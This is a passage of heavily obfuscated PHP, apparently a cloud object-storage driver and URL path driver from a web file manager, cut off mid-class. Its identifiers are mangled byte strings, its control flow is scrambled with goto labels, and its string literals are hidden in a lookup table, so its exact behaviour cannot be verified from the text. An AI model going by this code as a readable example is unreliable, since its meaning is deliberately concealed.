$this->pathThis($d‹ßÌ’‡¯±), $f‘º ±ŒÇ£[85] => $this->getPathOuter($f‘º ±ŒÇ£[18] . $d‹ßÌ’‡¯±), $f‘º ±ŒÇ£[39] => $f‘º ±ŒÇ£[86], $f‘º ±ŒÇ£[197] => 0, $f‘º ±ŒÇ£[117] => isset($B‡Æ›­ ù[$f‘º ±ŒÇ£[1249]]) ? $B‡Æ›­ ù[$f‘º ±ŒÇ£[1249]] : 0, $f‘º ±ŒÇ£[1159] => !0, $f‘º ±ŒÇ£[1160] => !0); if (empty($aÕùÉ‡ƒŒÎ)) { $aÕùÉ‡ƒŒÎ = $this->objectMeta($d‹ßÌ’‡¯±); if (!$aÕùÉ‡ƒŒÎ) { return $A÷ó´öËé; } $A÷ó´öËé[$f‘º ±ŒÇ£[197]] = $aÕùÉ‡ƒŒÎ[$f‘º ±ŒÇ£[1250]]; $A÷ó´öËé[$f‘º ±ŒÇ£[117]] = $aÕùÉ‡ƒŒÎ[$f‘º ±ŒÇ£[1251]]; } return $A÷ó´öËé; } private function fileList($føÊµåÎÂ”, $EáÒÎ×¨–ƒ = 0, $d»§ˆĞ„¡é = 1000) { $føá¯–»†ò =& $_SERVER[©]; $D‹µ§œ‡Â½ = array($føá¯–»†ò[1252], $føá¯–»†ò[1253] . $d»§ˆĞ„¡é); if ($EáÒÎ×¨–ƒ) { $D‹µ§œ‡Â½[] = $føá¯–»†ò[1254] . $EáÒÎ×¨–ƒ; } $aììÎËŒñ = $this->ussRequest($føÊµåÎÂ”, $føá¯–»†ò[226], !1, $D‹µ§œ‡Â½); return !$aììÎËŒñ[$føá¯–»†ò[1029]] ? !1 : $aììÎËŒñ[$føá¯–»†ò[1031]]; } public function listPath($c…ˆï Ì³, $c¨§ö¿›ŠÒ = false) { goto e¾ê•Í’–º; C©¥è™ğ˜: return array($cöŞ²ò²®Ê[84] => $f¨¯‡ÄÓä”, $cöŞ²ò²®Ê[83] => $fñ†Úê˜ë); goto AÓÎÖÃå‹; e¾ê•Í’–º: $cöŞ²ò²®Ê =& $_SERVER[©]; $a•´‰¼š§ = $cöŞ²ò²®Ê[43]; $A¸ËµØñÜ = 1000; goto D”ˆ½ÔŠ±¾; D”ˆ½ÔŠ±¾: $f¨¯‡ÄÓä” = $fñ†Úê˜ë = array(); $bŞ‡†£Óç™ = rtrim($c…ˆï Ì³, $cöŞ²ò²®Ê[18]) . $cöŞ²ò²®Ê[18]; while (!0) { $BˆÍ‡œš = $this->fileList($c…ˆï Ì³, $a•´‰¼š§, $A¸ËµØñÜ); if (!$BˆÍ‡œš) { return !1; } $a•´‰¼š§ = isset($BˆÍ‡œš[$cöŞ²ò²®Ê[1255]]) ? $BˆÍ‡œš[$cöŞ²ò²®Ê[1255]] : $cöŞ²ò²®Ê[43]; $cŞóœ­½šÚ = isset($BˆÍ‡œš[$cöŞ²ò²®Ê[1256]]) ? $BˆÍ‡œš[$cöŞ²ò²®Ê[1256]] : array(); foreach ($cŞóœ­½šÚ as $cŸØé±Õì) { if ($cŸØé±Õì[$cöŞ²ò²®Ê[39]] == $cöŞ²ò²®Ê[86]) { $f¨¯‡ÄÓä”[] = $this->folderInfo($bŞ‡†£Óç™ . $cŸØé±Õì[$cöŞ²ò²®Ê[38]], $c¨§ö¿›ŠÒ, $cŸØé±Õì); } else { $fñ†Úê˜ë[] = $this->fileInfo($bŞ‡†£Óç™ . $cŸØé±Õì[$cöŞ²ò²®Ê[38]], $c¨§ö¿›ŠÒ, $cŸØé±Õì); } } if (count($cŞóœ­½šÚ) < $A¸ËµØñÜ) { break; } } goto C©¥è™ğ˜; AÓÎÖÃå‹: } private function recursionAllFiles($F¸“„Á–Æ, &$b¤œŒ®ÖóÛ) { $C¾ÕŠÀÏ£Û =& $_SERVER[©]; $B¥¯¥…‡õ— = $C¾ÕŠÀÏ£Û[43]; $aÃÂ‰Š¤±© = 1000; $c­âÉ¡Ä—¸ = $d–„Ê÷…¡ = array(); $e¡ô¾ˆ‰Û = rtrim($F¸“„Á–Æ, $C¾ÕŠÀÏ£Û[18]) . $C¾ÕŠÀÏ£Û[18]; while (!0) { $bÇ–Ô°ëĞ = $this->fileList($F¸“„Á–Æ, $B¥¯¥…‡õ—, $aÃÂ‰Š¤±©); if (!$bÇ–Ô°ëĞ) { return !1; } $B¥¯¥…‡õ— = isset($bÇ–Ô°ëĞ[$C¾ÕŠÀÏ£Û[1255]]) ? $bÇ–Ô°ëĞ[$C¾ÕŠÀÏ£Û[1255]] : $C¾ÕŠÀÏ£Û[43]; $B‰‹¸Êˆ¡ã = isset($bÇ–Ô°ëĞ[$C¾ÕŠÀÏ£Û[1256]]) ? $bÇ–Ô°ëĞ[$C¾ÕŠÀÏ£Û[1256]] : array(); foreach ($B‰‹¸Êˆ¡ã as $B¹ŠøöÏ‡å) { $fËìëª¬¿² = array($C¾ÕŠÀÏ£Û[85] => $e¡ô¾ˆ‰Û . $B¹ŠøöÏ‡å[$C¾ÕŠÀÏ£Û[38]], $C¾ÕŠÀÏ£Û[86] => $B¹ŠøöÏ‡å[$C¾ÕŠÀÏ£Û[39]] == $C¾ÕŠÀÏ£Û[86] ? 1 : 0, $C¾ÕŠÀÏ£Û[87] => isset($B¹ŠøöÏ‡å[$C¾ÕŠÀÏ£Û[334]]) ? $B¹ŠøöÏ‡å[$C¾ÕŠÀÏ£Û[334]] : 0); $b¤œŒ®ÖóÛ[] = $fËìëª¬¿²; if ($fËìëª¬¿²[$C¾ÕŠÀÏ£Û[86]] == 1) { $this->recursionAllFiles($fËìëª¬¿²[$C¾ÕŠÀÏ£Û[85]], $b¤œŒ®ÖóÛ); } } if (count($B‰‹¸Êˆ¡ã) < $aÃÂ‰Š¤±©) { break; } } } public function has($BÈ°‹Îë, $D‘Øìè¹ = false, $BŠëÃ“Ê‚Ñ = true) { goto aÕƒĞ‹õî; aÕƒĞ‹õî: $f ÷‘‰Ì« =& $_SERVER[©]; $CŠñâàÇÔÉ = $f ÷‘‰Ì«[43]; $c³æ£œ¯¿ = 1000; goto c¨Ë‰âÓ; F»à’…¢†: while (!0) { $B³ÂµÃ¬†» = $this->fileList($BÈ°‹Îë, $CŠñâàÇÔÉ, $c³æ£œ¯¿); if (!$B³ÂµÃ¬†») { return !1; } $CŠñâàÇÔÉ = isset($B³ÂµÃ¬†»[$f ÷‘‰Ì«[1255]]) ? $B³ÂµÃ¬†»[$f ÷‘‰Ì«[1255]] : $f ÷‘‰Ì«[43]; $C„‰å±ñšÒ = isset($B³ÂµÃ¬†»[$f ÷‘‰Ì«[1256]]) ? $B³ÂµÃ¬†»[$f ÷‘‰Ì«[1256]] : array(); if (empty($C„‰å±ñšÒ)) { break; } $A•²ÇÆÂ¨÷ = array_to_keyvalue($C„‰å±ñšÒ, $f ÷‘‰Ì«[43], $f ÷‘‰Ì«[39]); $cœ»ÅÈ† ® = array_count_values($A•²ÇÆÂ¨÷); $e§‡´õ± = isset($cœ»ÅÈ† ®[$f ÷‘‰Ì«[86]]) ? $cœ»ÅÈ† ®[$f ÷‘‰Ì«[86]] : 0; $Eâ¢ŠŒ»« = count($A•²ÇÆÂ¨÷) - $e§‡´õ±; if ($D‘Øìè¹) { $DŒŠš°ğß += $e§‡´õ±; $E‹¬—¥ª’ += $Eâ¢ŠŒ»«; if ($AùÙ¡ ç < $c³æ£œ¯¿) { break; } continue; } if ($BŠëÃ“Ê‚Ñ) { if ($Eâ¢ŠŒ»«) { return !0; } } else { if ($e§‡´õ±) { return !0; } } if (count($C„‰å±ñšÒ) < $c³æ£œ¯¿) { break; } } if ($D‘Øìè¹) { return array($f ÷‘‰Ì«[201] => $E‹¬—¥ª’, $f ÷‘‰Ì«[202] => $DŒŠš°ğß); } return !1; goto bÒ‘ªƒ«³; c¨Ë‰âÓ: $E‹¬—¥ª’ = 0; $DŒŠš°ğß = 0; $bâ˜šĞİØ— = rtrim($BÈ°‹Îë, $f ÷‘‰Ì«[18]) . $f ÷‘‰Ì«[18]; goto F»à’…¢†; bÒ‘ªƒ«³: } public function listAll($aƒÇ¼Ç×) { $Fš¤Õåâåî = array(); $this->recursionAllFiles($aƒÇ¼Ç×, $Fš¤Õåâåî); return $Fš¤Õåâåî; } public function canRead($BóÌ’†Ÿø) { return $this->exist($BóÌ’†Ÿø) ? !0 : !1; } public function canWrite($dÌÕ¶¾º÷) { return $this->exist($dÌÕ¶¾º÷) ? !0 : !1; } public function getContent($A¦¤ ¹‚) { return $this->fileSubstr($A¦¤ ¹‚, 0, -1); } public function setContent($C‹Œá‰†¾æ, $DÃ§ğÏæØ® = '') { $c¿Ïí£Ÿ¡ =& $_SERVER[©]; if (!$DÃ§ğÏæØ®) { $eŠ†šİ–÷è = $this->ussRequest($C‹Œá‰†¾æ, $c¿Ïí£Ÿ¡[222]); return $eŠ†šİ–÷è[$c¿Ïí£Ÿ¡[1029]]; } $EÄùóêßÁ‰ = $this->tempFile($this->pathThis($C‹Œá‰†¾æ)); file_put_contents($EÄùóêßÁ‰, $DÃ§ğÏæØ®); if ($this->upload($C‹Œá‰†¾æ, $EÄùóêßÁ‰)) { $this->tempFileRemve($EÄùóêßÁ‰); return !0; } return !1; } public function fileSubstr($fˆ¡¼³Ã, $CÙ§³ÎÖ¡„, $f‚‡¢Ã’›) { $aŸÒ›ÕíÖİ =& $_SERVER[©]; if (!($a­Î‚¨©Ùò = $this->link($fˆ¡¼³Ã))) { return !1; } $FïËí—º–­ = !1; if ($f‚‡¢Ã’› > 0) { $F…Ò†ºïîÛ = $CÙ§³ÎÖ¡„ + $f‚‡¢Ã’› - 1; $FïËí—º–­ = array($aŸÒ›ÕíÖİ[1217] . $CÙ§³ÎÖ¡„ . $aŸÒ›ÕíÖİ[420] . $F…Ò†ºïîÛ); } $dãŸÂÅ‚÷„ = url_request($a­Î‚¨©Ùò, $aŸÒ›ÕíÖİ[226], !1, $FïËí—º–­); return $dãŸÂÅ‚÷„[$aŸÒ›ÕíÖİ[688]] ? $dãŸÂÅ‚÷„[$aŸÒ›ÕíÖİ[1031]] : !1; } public function upload($FÌÊáîç¦, $B’è½’àº¨, $Dë—á‰³ï³ = false, $Dó…‡Òö¨Û = REPEAT_REPLACE) { goto Cì¨ãÀèÑ; eµìÖñç†ì: do { $A‡÷“‚÷ÉÈ = $DÄÙ¥Àâ˜¯[$aö¸­‡é·Í[1263]]; fseek($f¼•†«‹·Ó, $bçÓ„š­ÒÉ); $FÉ†×ŸÑ’ = fread($f¼•†«‹·Ó, $A‡÷“‚÷ÉÈ); $Fß±¦¢ï·ê = 0; do { $Fß±¦¢ï·ê++; $DÄÙ¥Àâ˜¯ = $this->uploadPart($FÌÊáîç¦, $DÄÙ¥Àâ˜¯, $FÉ†×ŸÑ’); } while (!$DÄÙ¥Àâ˜¯ && $Fß±¦¢ï·ê < 3); if (!$DÄÙ¥Àâ˜¯) { return !1; } $E°‹©¨ø§‹ = $DÄÙ¥Àâ˜¯[$aö¸­‡é·Í[1262]]; $bçÓ„š­ÒÉ += $A‡÷“‚÷ÉÈ; } while ($E°‹©¨ø§‹ != -1); fclose($f¼•†«‹·Ó); $f‹âÀÀÚ¸ = array($aö¸­‡é·Í[1264], $aö¸­‡é·Í[1265] . $DÄÙ¥Àâ˜¯[$aö¸­‡é·Í[1266]], $aö¸­‡é·Í[1260]); goto c‚‚¼œ±ë; c‚‚¼œ±ë: $E¶Œâø¨–´ = $this->ussRequest($FÌÊáîç¦, $aö¸­‡é·Í[224], !1, $f‹âÀÀÚ¸); return $E¶Œâø¨–´[$aö¸­‡é·Í[1029]] ? $this->getPathOuter($Cæ±ÎÄÄÏ) : !1; goto AßÀ…šíß; föÅ°Œ¸å«: if (!$E¶Œâø¨–´[$aö¸­‡é·Í[1029]]) { return !1; } $DÄÙ¥Àâ˜¯ = $E¶Œâø¨–´[$aö¸­‡é·Í[1031]]; $bçÓ„š­ÒÉ = 0; goto EäÔ’À†Á; EäÔ’À†Á: $E°‹©¨ø§‹ = $DÄÙ¥Àâ˜¯[$aö¸­‡é·Í[1262]]; $f¼•†«‹·Ó = fopen($B’è½’àº¨, $aö¸­‡é·Í[1167]); if (!$f¼•†«‹·Ó) { return !1; } goto eµìÖñç†ì; Cì¨ãÀèÑ: $aö¸­‡é·Í =& $_SERVER[©]; $A÷†îòÎÌ¼ = IO::size($B’è½’àº¨); if ($A÷†îòÎÌ¼ <= 1024 * 1024 * 200) { $Cˆ³’Ÿ°Û = array($aö¸­‡é·Í[1257] . $B’è½’àº¨); $E¶Œâø¨–´ = $this->ussRequest($FÌÊáîç¦, $aö¸­‡é·Í[224], $Cˆ³’Ÿ°Û); return $E¶Œâø¨–´[$aö¸­‡é·Í[1029]] ? $this->getPathOuter($FÌÊáîç¦) : !1; } goto DˆİÄ¼äÙ; DˆİÄ¼äÙ: $AÀ÷ÅÄÒ² = 1024 * 1024 * 10; $f‹âÀÀÚ¸ = array($aö¸­‡é·Í[1258], $aö¸­‡é·Í[1259] . $A÷†îòÎÌ¼, $aö¸­‡é·Í[1260], $aö¸­‡é·Í[1261] . $AÀ÷ÅÄÒ²); $E¶Œâø¨–´ = $this->ussRequest($FÌÊáîç¦, $aö¸­‡é·Í[224], !1, $f‹âÀÀÚ¸); goto föÅ°Œ¸å«; AßÀ…šíß: } private function uploadPart($dÓ÷ˆœ çƒ, $bÑÆ ©÷Ê, &$b¾÷£¤â¤é) { $FŞãŠ¦Âø =& $_SERVER[©]; $bøµãàÊğ‘ = array($FŞãŠ¦Âø[1267], $FŞãŠ¦Âø[1265] . $bÑÆ ©÷Ê[$FŞãŠ¦Âø[1266]], $FŞãŠ¦Âø[1268] . $bÑÆ ©÷Ê[$FŞãŠ¦Âø[1262]], $FŞãŠ¦Âø[148] . $bÑÆ ©÷Ê[$FŞãŠ¦Âø[1263]]); $Eœî“†¥¼­ = $this->ussRequest($dÓ÷ˆœ çƒ, $FŞãŠ¦Âø[224], $b¾÷£¤â¤é, $bøµãàÊğ‘); return !$Eœî“†¥¼­[$FŞãŠ¦Âø[1029]] ? $Eœî“†¥¼­[$FŞãŠ¦Âø[1029]] : $Eœî“†¥¼­[$FŞãŠ¦Âø[1031]]; } public function uploadFormData($c×‹İ é¹Ô, $eêª¨ĞË÷ø = 3600) { return $this->uploadPolicy($c×‹İ é¹Ô, $eêª¨ĞË÷ø); } public function multiUploadFormData($a÷Ã¡ÎÚ£´, $aØ´…í®¢ = 3600) { $d —õÍ‰“Ü =& $_SERVER[©]; $dÜêì¸¶ö = (int) $GLOBALS[$d —õÍ‰“Ü[17]][$d —õÍ‰“Ü[87]]; return $this->uploadPolicy($a÷Ã¡ÎÚ£´, $aØ´…í®¢, $dÜêì¸¶ö); } private function uploadPolicy($bêÙ”î»‘ç, $e–ÈêƒŸò = 3600, $B­ˆ†©Õ£˜ = 0) { goto Bçò½ŠÁ§½; Bçò½ŠÁ§½: $aÊÖÒŒğ° =& $_SERVER[©]; $dªµÜĞ = $aÊÖÒŒğ°[18] . $this->bucket; $Bª× ¹“‚õ = gmdate($aÊÖÒŒğ°[1202]); goto e•ó†‡¨³¦; e•ó†‡¨³¦: $DçèÄöìğË = array($aÊÖÒŒğ°[1269] => $this->bucket, $aÊÖÒŒğ°[1270] => $bêÙ”î»‘ç, $aÊÖÒŒğ°[1271] => time() + $e–ÈêƒŸò, $aÊÖÒŒğ°[1272] => $Bª× ¹“‚õ); if ($B­ˆ†©Õ£˜) { $DçèÄöìğË[$aÊÖÒŒğ°[1188]] = $B­ˆ†©Õ£˜; } $EôĞôåÎË = base64_encode(json_encode($DçèÄöìğË)); goto EìøçŒ…¢¦; EìøçŒ…¢¦: $e“Ñé„°Û¯ = base64_encode(hash_hmac($aÊÖÒŒğ°[1239], "\120\x4f\x53\124\x26{$dªµÜĞ}\46{$Bª× ¹“‚õ}\46{$EôĞôåÎË}", md5("{$this->userpass}"), !0)); $D‘óíæ‚â = array($aÊÖÒŒğ°[1109] => $EôĞôåÎË, $aÊÖÒŒğ°[1273] => "\x55\120\131\x55\116\x20{$this->username}\72{$e“Ñé„°Û¯}", $aÊÖÒŒğ°[179] => $this->endpoint . $dªµÜĞ); return $D‘óíæ‚â; goto dºƒùñ¥´é; dºƒùñ¥´é: } public function download($Bá™¡Ó›£„, $D‰—Æ«ÂÄ) { goto fÊ¾ïªí”„; AøğÃ˜¶Ôñ: fclose($D‚‰¬äæ½Ì); return $D‰—Æ«ÂÄ; goto c—ˆöé´©; fÊ¾ïªí”„: $dŸŒ¸ŞÆ³† = IO::getPathInner(IO::mkfile($D‰—Æ«ÂÄ)); if (!($EˆŠ¿ª¶Î• = $this->link($Bá™¡Ó›£„))) { return !1; } $b‰³ãªØœÛ = 0; goto c•·ïé³Ö»; c•·ïé³Ö»: $c¬µ×‡ë¶ï = 1024 * 200; $D‚‰¬äæ½Ì = fopen($dŸŒ¸ŞÆ³†, $_SERVER[©][1223]); while (!0) { $cä©îŠ¡°¯ = $this->fileSubstr($Bá™¡Ó›£„, $b‰³ãªØœÛ, $c¬µ×‡ë¶ï); if ($cä©îŠ¡°¯ === !1) { return !1; } fwrite($D‚‰¬äæ½Ì, $cä©îŠ¡°¯); $b‰³ãªØœÛ += $c¬µ×‡ë¶ï; if (strlen($cä©îŠ¡°¯) < $c¬µ×‡ë¶ï) { break; } } goto AøğÃ˜¶Ôñ; c—ˆöé´©: } public function link($c·Ğ‹ğ†¸Œ, $Dó”à„´ˆ» = array()) { $B†ä‰óÔ£¹ =& $_SERVER[©]; $c·Ğ‹ğ†¸Œ = trim($c·Ğ‹ğ†¸Œ, $B†ä‰óÔ£¹[18]); if (!empty($this->token)) { $DÌ³ù’»¸¤ = strtotime(date($B†ä‰óÔ£¹[1274])); $Bñì¶òÍµ« = substr(md5($this->token . $B†ä‰óÔ£¹[281] . $DÌ³ù’»¸¤ . $B†ä‰óÔ£¹[1275] . $c·Ğ‹ğ†¸Œ), 12, 8) . $DÌ³ù’»¸¤; $Dó”à„´ˆ»[] = $B†ä‰óÔ£¹[1276] . $Bñì¶òÍµ«; } $eñò¹ªÀÎÖ = !empty($Dó”à„´ˆ») ? $B†ä‰óÔ£¹[79] . implode($B†ä‰óÔ£¹[281], $Dó”à„´ˆ») : $B†ä‰óÔ£¹[43]; return $this->getHost() . $B†ä‰óÔ£¹[18] . $c·Ğ‹ğ†¸Œ . $eñò¹ªÀÎÖ; } public function fileOut($B©½ø™¼§, $C‰›çª×‘¯ = false, $bØğ·à„Ä‹ = false, $F×—„éŒË = '') { if (!$bØğ·à„Ä‹) { $bØğ·à„Ä‹ = $this->pathThis($B©½ø™¼§); } $b„ì¹Û‹Ÿ… = $C‰›çª×‘¯ ? array($_SERVER[©][1277] . rawurlencode($bØğ·à„Ä‹)) : array(); $D˜é‘¨—í§ = $this->link($B©½ø™¼§, $b„ì¹Û‹Ÿ…); $this->fileOutLink($D˜é‘¨—í§); } public function fileOutServer($b‹¼¦ÅÏÜ», $CßÌºÍ‰´¡ = false, $e›Á‘ØÃÖÊ = false, $dÀ²õƒîÉ¦ = '') { parent::fileOut($b‹¼¦ÅÏÜ», $CßÌºÍ‰´¡, $e›Á‘ØÃÖÊ, $dÀ²õƒîÉ¦); } public function fileOutImage($Fã‘Ìó, $a‹ğŒ¬‘‹­ = 250) { $CÖ¿ÇÍ ºö = $this->link($Fã‘Ìó . $_SERVER[©][1278] . $a‹ğŒ¬‘‹­); $this->fileOutLink($CÖ¿ÇÍ ºö); } public function fileOutImageServer($C»¼Çõ£’¿, $AµğÚª•ğ = 250) { parent::fileOutImage($C»¼Çõ£’¿, $AµğÚª•ğ); } public function hashMd5($B»Ñ‡á„¶¼) { $A¦ÎÀ×ÖÈš =& $_SERVER[©]; $AÇÁâæùË = $this->objectMeta($B»Ñ‡á„¶¼); return isset($AÇÁâæùË[$A¦ÎÀ×ÖÈš[206]]) ? $AÇÁâæùË[$A¦ÎÀ×ÖÈš[206]] : !1; } public function size($A§À¥åäíÎ) { $cÜ…Ö´âÚ = $this->objectMeta($A§À¥åäíÎ); return $cÜ…Ö´âÚ ? $cÜ…Ö´âÚ[$_SERVER[©][87]] : 0; } public function info($a¹âŸÅã©¦) { if ($this->isFolder($a¹âŸÅã©¦)) { return $this->folderInfo($a¹âŸÅã©¦); } else { if ($this->isFile($a¹âŸÅã©¦)) { return $this->fileInfo($a¹âŸÅã©¦); } } return !1; } public function exist($fñİ‡ÆˆÌÎ) { return $this->isFile($fñİ‡ÆˆÌÎ) || $this->isFolder($fñİ‡ÆˆÌÎ); } public function isFile($DÛÉ¶Òï¢÷) { return !$this->isFolder($DÛÉ¶Òï¢÷) && $this->objectMeta($DÛÉ¶Òï¢÷); } public function isFolder($f¶ŠÊëÇóÈ) { return $this->cacheMethod($_SERVER[©][232], $f¶ŠÊëÇóÈ); } protected function objectMeta($A­é¶•ôé) { return $this->cacheMethod($_SERVER[©][233], $A­é¶•ôé); } protected function _objectMeta($FØ¾É…œŒÇ) { goto D»•©„åëÕ; A÷òù™Âñ: $E¾ÔÅ¿ = array($f¼ºÒé±‰š[38] => get_path_this($FØ¾É…œŒÇ), $f¼ºÒé±‰š[39] => isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1280]]) ? $EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1280]] : null, $f¼ºÒé±‰š[87] => isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1281]]) ? $EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1281]] : null, $f¼ºÒé±‰š[206] => isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1282]]) ? $EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1282]] : null, $f¼ºÒé±‰š[1250] => isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1283]]) ? $EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1283]] : null); $E¾ÔÅ¿[$f¼ºÒé±‰š[1251]] = isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1284]]) ? strtotime($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1284]]) : $E¾ÔÅ¿[$f¼ºÒé±‰š[1250]]; return $E¾ÔÅ¿; goto F‚è‘¡Üºˆ; Aœ•‡Ú³Œ: if (!$Fèµ•£Í[$f¼ºÒé±‰š[1029]]) { return null; } $EÇÌ‘êõÛĞ = isset($Fèµ•£Í[$f¼ºÒé±‰š[1031]]) ? $Fèµ•£Í[$f¼ºÒé±‰š[1031]] : array(); if (!isset($EÇÌ‘êõÛĞ[$f¼ºÒé±‰š[1280]])) { return null; } goto A÷òù™Âñ; D»•©„åëÕ: $f¼ºÒé±‰š =& $_SERVER[©]; if ($FØ¾É…œŒÇ == $f¼ºÒé±‰š[43] || $FØ¾É…œŒÇ == $f¼ºÒé±‰š[18]) { return array(); } $Fèµ•£Í = $this->ussRequest($FØ¾É…œŒÇ, $f¼ºÒé±‰š[1279]); goto Aœ•‡Ú³Œ; F‚è‘¡Üºˆ: } protected function _isFolder($CÛ›º†£ˆ) { $aÊÆÍ ›õ» =& $_SERVER[©]; if ($CÛ›º†£ˆ == $aÊÆÍ ›õ»[43] || $CÛ›º†£ˆ == $aÊÆÍ ›õ»[18]) { return !0; } $cæÚ‹Ï«‰ = $this->objectMeta($CÛ›º†£ˆ); return isset($cæÚ‹Ï«‰[$aÊÆÍ ›õ»[39]]) && $cæÚ‹Ï«‰[$aÊÆÍ ›õ»[39]] == $aÊÆÍ ›õ»[86] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($EŒâìæ³ = false) { } public function exist($cá—ˆáÓ¿¨) { $eµĞ²ìèÀ† = $this->info($cá—ˆáÓ¿¨); return $eµĞ²ìèÀ†[$_SERVER[©][198]]; } public function isFile($FßƒóÌ„îª) { $a­Åİ·œ‰œ = $this->info($FßƒóÌ„îª); return $a­Åİ·œ‰œ[$_SERVER[©][198]]; } public function isFolder($D«áÂÃÏÍ„) { return !1; } public function size($F¨”Ç‚…¨) { $e§¬´ì = $this->info($F¨”Ç‚…¨); return $e§¬´ì[$_SERVER[©][87]]; } public function info($f†ïÛ§„–½) { return $this->infoParse($f†ïÛ§„–½); } public function infoAuth($aÉçÀ¶ì‰) { return $this->infoParse($aÉçÀ¶ì‰); } public function infoWithChildren($bÆ£»’ã¾») { return $this->infoParse($bÆ£»’ã¾»); } public function infoFull($d‚Ÿñ³’‰) { return $this->infoParse($d‚Ÿñ³’‰); } private function infoParse($A¦ìˆóíŠ) { $c½ªà±ìµ­ =& $_SERVER[©]; $d©¶ª‘Ë™† = $this->header($A¦ìˆóíŠ); if (!$d©¶ª‘Ë™† || !$d©¶ª‘Ë™†[$c½ªà±ìµ­[688]]) { return !1; } $e¹‹Œä©³ï = _get($d©¶ª‘Ë™†, $c½ªà±ìµ­[334], 0); $CÒŠÂƒİ = array($c½ªà±ìµ­[38] => $d©¶ª‘Ë™†[$c½ªà±ìµ­[38]], $c½ªà±ìµ­[85] => $A¦ìˆóíŠ, $c½ªà±ìµ­[39] => $c½ªà±ìµ­[177], $c½ªà±ìµ­[87] => intval($e¹‹Œä©³ï), $c½ªà±ìµ­[170] => get_path_ext($d©¶ª‘Ë™†[$c½ªà±ìµ­[38]]), $c½ªà±ìµ­[1159] => $e¹‹Œä©³ï > 0 && $d©¶ª‘Ë™†[$c½ªà±ìµ­[1285]], $c½ªà±ìµ­[1160] => !1); return $CÒŠÂƒİ; } private function header($b‚ÄÏ•æ) { if (isset(self::$_cacheHeader[$b‚ÄÏ•æ])) { return self::$_cacheHeader[$b‚ÄÏ•æ]; } self::$_cacheHeader[$b‚ÄÏ•æ] = url_header($b‚ÄÏ•æ); return self::$_cacheHeader[$b‚ÄÏ•æ]; } public function hashSimple($FÊÎ…Ä‹, $FÙ‹ÙÖíµ = false) { goto F¹Ş®†­–Ÿ; fáÄ¶¡î£: $Fó…Ñ¡Ç’‚ = $FÌ”ø´ˆÂ[$a®‡ô÷ºâ[87]]; $Fˆì¦Ü§á¥ = 200; $F¸ïŞÃÒËÈ = 50; goto bÎÎ–¬Û‹; FŸÛ„ÖÂÃ­: $aÂ×ìÙ”ø· = timeFloat(); $DÓô¥½Ÿˆ = 15; for ($cÛšœ¡îêŒ = 0; $cÛšœ¡îêŒ < $F¸ïŞÃÒËÈ; $cÛšœ¡îêŒ++) { if (timeFloat() - $aÂ×ìÙ”ø· > $DÓô¥½Ÿˆ) { return !1; } $A»–Ä½ÉÔ = $this->fileSubstr($FÊÎ…Ä‹, $F®ß”™Ò¹ì * $cÛšœ¡îêŒ, $Fˆì¦Ü§á¥); if (!$A»–Ä½ÉÔ) { return !1; } $d£…Ñ‹Ç¢ .= $A»–Ä½ÉÔ; } goto A´Ìãêˆ‡¡; bÎÎ–¬Û‹: if ($Fó…Ñ¡Ç’‚ <= $Fˆì¦Ü§á¥ * $F¸ïŞÃÒËÈ) { return md5($this->fileSubstr($FÊÎ…Ä‹, 0, $Fó…Ñ¡Ç’‚)) . $Fó…Ñ¡Ç’‚; } $F®ß”™Ò¹ì = intval($Fó…Ñ¡Ç’‚ / $F¸ïŞÃÒËÈ); $d£…Ñ‹Ç¢ = $a®‡ô÷ºâ[43]; goto FŸÛ„ÖÂÃ­; A´Ìãêˆ‡¡: $d£…Ñ‹Ç¢ .= $this->fileSubstr($FÊÎ…Ä‹, $Fó…Ñ¡Ç’‚ - $Fˆì¦Ü§á¥, $Fˆì¦Ü§á¥); return md5($d£…Ñ‹Ç¢) . $Fó…Ñ¡Ç’‚; goto FÑÖ­·¦†´; F¹Ş®†­–Ÿ: $a®‡ô÷ºâ =& $_SERVER[©]; $FÌ”ø´ˆÂ = $this->info($FÊÎ…Ä‹); if (!$FÌ”ø´ˆÂ || !$FÌ”ø´ˆÂ[$a®‡ô÷ºâ[198]]) { return !1; } goto fáÄ¶¡î£; FÑÖ­·¦†´: } public function getContent($Eï…åÌŠª°) { return $this->fileSubstr($Eï…åÌŠª°); } public function fileSubstr($Cğ„ªÜº†, $c™é°õŒ©‘ = 0, $bñßÍ¡Ç©ò = -1) { goto eˆ‘é¿Ãè; a«¦èÒ”: if ($bñßÍ¡Ç©ò === -1) { $bñßÍ¡Ç©ò = $C…ãáİò‰ò[$A»–íËÀ„¼[87]]; } if ($bñßÍ¡Ç©ò == 0) { return $A»–íËÀ„¼[43]; } $a»À”¨ŒÏÍ = array($A»–íËÀ„¼[1286] . $c™é°õŒ©‘ . $A»–íËÀ„¼[715] . ($c™é°õŒ©‘ + $bñßÍ¡Ç©ò - 1)); goto C½„…Åñ¢”; eˆ‘é¿Ãè: $A»–íËÀ„¼ =& $_SERVER[©]; $C…ãáİò‰ò = $this->info($Cğ„ªÜº†); if (!$C…ãáİò‰ò || !$C…ãáİò‰ò[$A»–íËÀ„¼[198]] && $C…ãáİò‰ò[$A»–íËÀ„¼[87]] > 1024 * 1024 * 10) { return !1; } goto a«¦èÒ”; C½„…Åñ¢”: $E÷è„«±©š = url_request($Cğ„ªÜº†, $A»–íËÀ„¼[226], !1, $a»À”¨ŒÏÍ, !1, !1, 1); return $E÷è„«±©š[$A»–íËÀ„¼[1031]] ? $E÷è„«±©š[$A»–íËÀ„¼[1031]] : $A»–íËÀ„¼[43]; goto bÈâ¥ÇÅÎ; bÈâ¥ÇÅÎ: } public function download($fÍ¢èñˆ“Ò, $BÆ¦ÏÔ›) { Downloader::start($fÍ¢èñˆ“Ò, $BÆ¦ÏÔ›); return $BÆ¦ÏÔ›; } } goto BÈ§‘Éñ¾Ù; EŒ»ñ—…‘: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $Aá©áÍˆ³‘ =& $_SERVER[©]; self::$name = date($Aá©áÍˆ³‘[686]); if 